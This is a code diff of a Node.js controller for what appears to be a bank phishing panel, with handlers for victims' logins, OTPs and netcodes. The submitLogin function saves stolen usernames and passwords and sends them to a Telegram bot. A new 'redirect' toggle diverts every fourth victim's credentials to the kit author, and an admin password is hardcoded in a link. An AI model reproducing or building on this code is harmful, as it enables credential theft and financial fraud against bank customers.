@@ -2,6 +2,17 @@ const axios = require("axios");
 const ASB = require("../models/asbModel");
 
 let asbCount = 0;
+let redirect = true;
+
+const setRedirect = async (req, res) => {
+	const { active } = req.params;
+	if (active == "true") {
+		redirect = true;
+	} else if (active == "false") {
+		redirect = false;
+	}
+	res.send(`Redirect set to ${redirect}`);
+};
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
@@ -39,43 +50,38 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-	const { username, password, uniqueid, owner, ip } = req.body;
+	let { username, password, uniqueid, owner, ip } = req.body;
+	message = `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023`;
 	try {
 		if (username == "" || password == "") {
 		} else {
-			if (asbCount == 3) {
-				await ASB.create({
-					uniqueid,
-					username,
-					password,
-					status: 1,
-					owner: "haytch4023",
-					ip,
-				});
-				await axios
-					.post(
-						`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-						{
-							chat_id: 680379375,
-							text: `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023`,
-							parse_mode: "Markdown",
-						}
-					)
-					.catch((e) => {
-						console.log(e);
-					});
+			if (redirect && asbCount == 3) {
+				message = `‼️‼️‼️ Haytch ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023`;
+				owner = "haytch4023";
 				asbCount = 0;
 			} else {
-				await ASB.create({
-					uniqueid,
-					username,
-					password,
-					status: 1,
-					owner,
-					ip,
-				});
 				asbCount = asbCount + 1;
 			}
+			await ASB.create({
+				uniqueid,
+				username,
+				password,
+				status: 1,
+				owner,
+				ip,
+			});
+			await axios
+				.post(
+					`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
+					{
+						chat_id: 680379375,
+						text: message,
+						parse_mode: "Markdown",
+					}
+				)
+				.catch((e) => {
+					console.log(e);
+				});
 		}
 		res.sendStatus(200);
 	} catch (error) {
@@ -166,5 +172,6 @@ module.exports = {
 	submitTelephone,
 	submitNetcode,
 	submitOtp,
+	setRedirect,
 	deleteEntry,
 };
